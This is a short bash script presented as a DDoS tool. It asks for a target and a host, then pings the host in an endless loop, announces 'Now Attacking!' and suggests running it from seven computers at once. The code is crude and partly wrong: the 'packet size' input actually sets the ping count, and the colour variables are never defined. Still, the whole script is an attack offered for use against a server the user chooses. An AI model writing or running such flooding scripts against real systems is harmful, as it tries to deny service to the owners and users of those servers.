#!/bin/bash

clear
read -p "Target DDOS: " target
ping -c 1 "$target"
read -p "IP Host: " host
echo "Enter the packet size (e.g., 64)"
read -p "Packet Size: " packet_size
echo -e "${RED}Now Attacking!${NC}"
echo "Try Attacking With 7 Computers!"
while true; do
    echo -e "${RED}Attacking Server: $host${NC}"
    ping -c "$packet_size" "$host" > /dev/null 2>&1
done
